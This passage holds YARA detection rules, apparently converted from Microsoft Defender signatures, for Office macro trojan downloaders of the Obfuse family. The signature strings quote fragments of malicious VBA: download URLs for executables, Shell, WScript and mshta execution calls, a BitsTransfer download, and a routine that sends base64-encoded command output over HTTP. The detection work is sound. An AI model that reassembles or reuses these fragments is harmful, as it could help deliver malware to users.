        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 22 63 75 72 6c 20 68 74 74 70 3a 2f 2f 77 77 77 2e 62 6f 6f 6b 69 71 2e 62 73 6e 6c 2e 63 6f 2e 69 6e 2f 64 61 74 61 5f 65 6e 74 72 79 2f 63 69 72 63 75 6c 61 72 73 2f 6d [0-5] 61 [0-5] 63 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (\"C:\\Users\\Public\\a.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDR_2147782022_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDR!MTB"
        threat_id = "2147782022"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d [0-3] 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 6d 62 2f 76 68 76 6a 68 67 62 76 76 6d 68 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDS_2147782025_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDS!MTB"
        threat_id = "2147782025"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://www.bookiq.bsnl.co.in/data_entry/circulars/mac.exe" ascii //weight: 1
        $x_1_2 = "Shell (\"file1.exe\")" ascii //weight: 1
        $x_1_3 = "= Environ(\"appdata\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSER_2147782060_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSER!MTB"
        threat_id = "2147782060"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Call schrhcuN" ascii //weight: 1
        $x_1_2 = "tBYqqxmFZ = Replace(tBYqqxmFZ, \"rqwgarzimsw\", \"\")" ascii //weight: 1
        $x_1_3 = {77 73 68 2e 52 75 6e 20 46 67 62 56 34 35 67 20 26 20 74 42 59 71 71 78 6d 46 5a 2c 20 2d 38 37 02 00 25 51 51 51 25 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SRV_2147782089_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SRV!MTB"
        threat_id = "2147782089"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Shell \"explorer copyFunction.hta\", vbNormalFocus" ascii //weight: 2
        $x_2_2 = "Shell \"explorer booleanZeroC.hta\", vbNormalFocus" ascii //weight: 2
        $x_2_3 = "Open \"copyFunction.hta\" & buttonReference For Output As #1" ascii //weight: 2
        $x_2_4 = "Open \"booleanZeroC.hta\" & buttonReference For Output As #1" ascii //weight: 2
        $x_1_5 = "Print #1, ActiveDocument.Range.Text" ascii //weight: 1
        $x_1_6 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 0d 0a 63 6c 65 61 72 53 63 72}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PRW_2147782233_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRW!MTB"
        threat_id = "2147782233"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"https://www.bitly.com/asiajiwn\"" ascii //weight: 1
        $x_1_2 = "\"m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 20 5f 02 00 28 53 74 72 52 65 76 65 72 73 65 20 5f 02 00 28 22 30 30 30 30 34 35 33 35 35 34 34 34 2d 45 39 34 41 2d 45 43 31 31 2d 39 37 32 43 2d 30 32 36 39 30 37 33 31 3a 77 65 6e 22 29 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PVD_2147782398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PVD!MTB"
        threat_id = "2147782398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "(Environ(\"USERPROFILE\") + \"\\Documents\\\" + \"qX2xpJ5V.txt\") Then" ascii //weight: 1
        $x_1_4 = "mp4klgzo.CreateFolder (pacbhdvc)" ascii //weight: 1
        $x_1_5 = "= q87fpor4.Run(\"wscript.exe //b \" + Chr(34) + qs + Chr(34), 4, False)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TRV_2147782888_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TRV!MTB"
        threat_id = "2147782888"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 65 78 70 6c 6f 72 65 72 20 [0-15] 2e 68 74 61 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_2 = {4f 70 65 6e 20 22 [0-15] 2e 68 74 61 22 20 26 20 62 75 74 74 6f 6e 52 65 66 65 72 65 6e 63 65 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = "Print #1, ActiveDocument.Range.Text" ascii //weight: 1
        $x_1_4 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TRV_2147782888_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TRV!MTB"
        threat_id = "2147782888"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shell Replace(\"wscript \"\"FILE\"\" \", \"FILE\", myFile)" ascii //weight: 1
        $x_1_2 = {57 73 68 53 68 65 6c 6c 2e 52 75 6e 20 22 22 22 22 22 22 25 55 73 65 72 50 72 6f 66 69 6c 65 25 5c [0-10] 2e 65 78 65 22 22 22 22 20 2d 64}  //weight: 1, accuracy: Low
        $x_1_3 = {6d 79 46 69 6c 65 20 3d 20 75 73 65 72 50 72 6f 66 69 6c 65 50 61 74 68 20 2b 20 22 5c 6c 61 79 6f 66 66 73 [0-2] 2e 76 62 73 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Open myFile For Output As #myoutputfile" ascii //weight: 1
        $x_1_5 = "Print #myoutputfile, \"HTTPDownload \"\"http://" ascii //weight: 1
        $x_1_6 = "objFile.Write Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_IBK_2147782925_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.IBK!MTB"
        threat_id = "2147782925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open','https://a.pomf.cat/uquyqs.t" ascii //weight: 1
        $x_1_2 = ".CreateTextFile(jrhuUJhg1 & \"\\\" & \"rberbr.js\", True, True)" ascii //weight: 1
        $x_1_3 = "Shell Environ(\"COMSPEC\") & \" /c start \" & jrhuUJhg1 & \"\\\" & \"rberbr.js\", vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AM_2147782997_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AM!MTB"
        threat_id = "2147782997"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set objOL = CreateObject(\"Outlook.Application\")" ascii //weight: 1
        $x_1_2 = "Set WshShell = objOL.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = "Set WshShellExec = WshShell.Exec(command)" ascii //weight: 1
        $x_1_4 = "RunCommand = WshShellExec.StdOut.ReadAll" ascii //weight: 1
        $x_1_5 = "arrData = StrConv(text, vbFromUnicode)" ascii //weight: 1
        $x_1_6 = "Set objXML = CreateObject(\"MSXML2.DOMDocument\")" ascii //weight: 1
        $x_1_7 = "EncodeBase64 = objNode.text" ascii //weight: 1
        $x_1_8 = "objHTTP.send (encryptData)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_URV_2147783104_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.URV!MTB"
        threat_id = "2147783104"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(unx(qsdfg & qerus), 1)" ascii //weight: 1
        $x_1_2 = "old_char = Asc(Mid(text, i, 1))" ascii //weight: 1
        $x_1_3 = "new_char = ChrW(old_char - 4 Mod 256)" ascii //weight: 1
        $x_1_4 = {71 73 64 66 67 20 3d 20 22 74 73 7b 69 76 77 6c 69 70 70 24 31 7b 6d 72 68 73 7b 77 78 7d 70 69 24 6c 6d 68 68 69 72 24 26 6a 79 72 67 78 6d 73 72 24 67 70 69 65 72 79 74 24 7f 6d 6a 24}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PYRX_2147783198_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PYRX!MTB"
        threat_id = "2147783198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(0, \"open\", koko, \"h\" _" ascii //weight: 1
        $x_1_2 = "+ \"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwshdwdwdwwdwmqwhda\", _" ascii //weight: 1
        $x_1_3 = "\"%public%\" _" ascii //weight: 1
        $x_1_4 = "\"Shell32.dll\" _" ascii //weight: 1
        $x_1_5 = "Alias _" ascii //weight: 1
        $x_1_6 = "\"ShellExecuteA\" _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VRV_2147783266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VRV!MTB"
        threat_id = "2147783266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwsnddwmwddwomwqwhda\", _" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 5f 0d 0a 20 20 28 30 2c 20 22 6f 70 65 6e 22 2c 20 6b 6f 6b 6f 2c 20 22 68 22 20 5f}  //weight: 1, accuracy: High
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 5f 0d 0a 53 68 65 6c 6c 45 78 65 63 75 74 65 20 5f 0d 0a 4c 69 62 20 5f 0d 0a 22 53 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 5f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_WRV_2147783337_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.WRV!MTB"
        threat_id = "2147783337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 3a 20 [0-20] 20 3d 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = "= K__Fg3(69) & K__Fg3(79) & K__Fg3(102) & K__Fg3(34) & K__Fg3(49) & K__Fg3(101) & K__Fg3(34)" ascii //weight: 1
        $x_1_3 = {6f 44 6f 63 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 0d 0a 20 20 20 20 6f 44 6f 63 2e 50 72 69 6e 74 4f 75 74}  //weight: 1, accuracy: High
        $x_1_4 = "\"hfgjghngh gfbd bbvcvhfg 345435 jmjgjhdf \"" ascii //weight: 1
        $x_1_5 = "K__Fg3 = Chr(DD - dde)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PXZR_2147783541_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PXZR!MTB"
        threat_id = "2147783541"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "baseball.confessionariesVilnius (\"Temp\")" ascii //weight: 1
        $x_1_2 = "Call copitasPicard(\"Clareaccidence\", \"Samnitecommunalisation\", \"chilly\")" ascii //weight: 1
        $x_1_3 = "'MsgBox \"ver:\" & ver & \" tot: \" & totby & \" dat:\" & (totby - ccsiz * ccblks) & \" need:\" & j" ascii //weight: 1
        $x_1_4 = "Debyebackspacescollegiate = Environ(confessionaries)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PYRT_2147783570_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PYRT!MTB"
        threat_id = "2147783570"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "obj.Procedurecall" ascii //weight: 1
        $x_1_2 = "hone the shelled application:" ascii //weight: 1
        $x_1_3 = "ReturnValue = CreateProcessA(0&, cmdline$, 0&, 0&, 1&, _" ascii //weight: 1
        $x_1_4 = "NORMAL_PRIORITY_CLASS, 0&, 0&, hone, mone)" ascii //weight: 1
        $x_1_5 = "arraymain(i).barcode = \"mshta \"" ascii //weight: 1
        $x_1_6 = {3d 20 22 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 64 [0-15] 77 64 69 61 68 73 69 64 68 22}  //weight: 1, accuracy: Low
        $x_1_7 = "obj.SUSSYBAKA (boba + bob2 + bob3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PXZS_2147783572_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PXZS!MTB"
        threat_id = "2147783572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "taliya = \"mshtple there is many thing in this life, People thing we are not normal\"" ascii //weight: 1
        $x_1_2 = "Metoo = String(1, \"a\")" ascii //weight: 1
        $x_1_3 = "Money = Left(taliya, 4) + String(1, \"a\") + Alienware + Replace(\"Loveofmyliufe\", \"Loveofmyliufe\", \"http:\\\\b\") & \"it.ly/qlotulpvbtlw46b5jx22\"" ascii //weight: 1
        $x_1_4 = "Call Shell(Money & sCommandToRun, vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PZSS_2147783753_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PZSS!MTB"
        threat_id = "2147783753"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set maqaraayhmweor = CreateObject(nxyolxmci)" ascii //weight: 1
        $x_1_2 = "= maqaraayhmweor.Run(pjehyevzqgylpj, ryevtddf)" ascii //weight: 1
        $x_1_3 = "= \"vdbgd gfdb fsvv + vfder \"" ascii //weight: 1
        $x_1_4 = "= Chr(fr___ee - 69)" ascii //weight: 1
        $x_1_5 = "= \"erteb trutj hytyr\"" ascii //weight: 1
        $x_1_6 = "Call jdqwp.cjkgjomnsqpubuwvkefu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSKT_2147784021_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSKT!MTB"
        threat_id = "2147784021"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= .CreateTextFile(Environ(\"ALLUSERSPROFILE\") & \"\\qIMEModeHangulFull.xsl\")" ascii //weight: 1
        $x_1_2 = "= \"Thank You!\"" ascii //weight: 1
        $x_1_3 = ", , \"Good\", Err.HelpFile, Err.HelpContext" ascii //weight: 1
        $x_1_4 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"Schedule.Service\")" ascii //weight: 1
        $x_1_6 = ".GetFolder(\"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NYEE_2147784750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NYEE!MTB"
        threat_id = "2147784750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "programstill = \"C:\\Users\\Public\\Documents\\singlerisk.bat\"" ascii //weight: 1
        $x_1_2 = "\" -w h Start-BitsTransfer -Source https://cargotrans-giobal.com/h/rrr.exe" ascii //weight: 1
        $x_1_3 = "-Destination C:\\Users\\Public\\Documents\\IMr.exe;" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = "Call womanlearn.Open(programstill)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSTT_2147784751_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSTT!MTB"
        threat_id = "2147784751"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Macro6.VB_ProcData.VB_Invoke_Func = \" \\n14\"" ascii //weight: 1
        $x_1_2 = {2e 63 6f 6d 2f 61 63 74 69 76 65 2f 73 65 61 72 63 68 4d 65 73 73 65 6e 67 65 72 2f 64 77 2e 70 68 70 3f 6d 6f 64 65 3d 65 74 63 22 2c 50 00 46 69 6c 65 5f 44 6f 77 6e 4c 6f 61 64 20 22 68 74 74 70 3a 2f 2f 77 77 77 2e 79 65 73 66 6f 72 6d}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell \"C:\\sMessenger\\searchMessenger_upgrade_x.exe\"" ascii //weight: 1
        $x_1_4 = "ActiveSheet.Unprotect Password = 1234" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PSTT_2147784751_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PSTT!MTB"
        threat_id = "2147784751"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(omegah_3, vbHideFocus):" ascii //weight: 1
        $x_1_2 = "= Application.ActiveWorkbook.FullName: Shell (\"cmd.exe /C  \"\"\" + omegah_9 + \"\"\"\")" ascii //weight: 1
        $x_1_3 = "(r, \"\"11Sf://xuNkIVX7.Ti/WV_jRiJcl/Afvor&NFgulr&QB.fMY?14=&mq0NAfymt0KAf\"\"," ascii //weight: 1
        $x_1_4 = "\"x:\\fHdIXpB\\3URY\\nGjuloz.3Ai\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKOP_2147785061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKOP!MTB"
        threat_id = "2147785061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sd = Chr(df - 103)" ascii //weight: 1
        $x_1_2 = ".Run(owuttakt, usevn)" ascii //weight: 1
        $x_1_3 = "Call kjxkackar.ddrhpottlfepmvwzkwsa" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_XRV_2147785076_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.XRV!MTB"
        threat_id = "2147785076"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "sd = Chr(df - 103)" ascii //weight: 1
        $x_1_2 = "sd(170) & sd(180) & sd(203) & sd(135) & sd(150) & sd(202) & sd(135)" ascii //weight: 1
        $x_1_3 = "= \"WSCript.shell\"" ascii //weight: 1
        $x_1_4 = "asdfaf = \"sdgfds csda bfgj vdfsh 424 grtjuy vfdsjhy \"" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-15] 2c 20 [0-15] 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKO_2147785337_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKO!MTB"
        threat_id = "2147785337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sd = Chr(df - 103)" ascii //weight: 1
        $x_1_2 = ".Run(sohmqyvabj, rsydwmbkhifxc)" ascii //weight: 1
        $x_1_3 = "zvic = zvic &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKO_2147785337_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKO!MTB"
        threat_id = "2147785337"
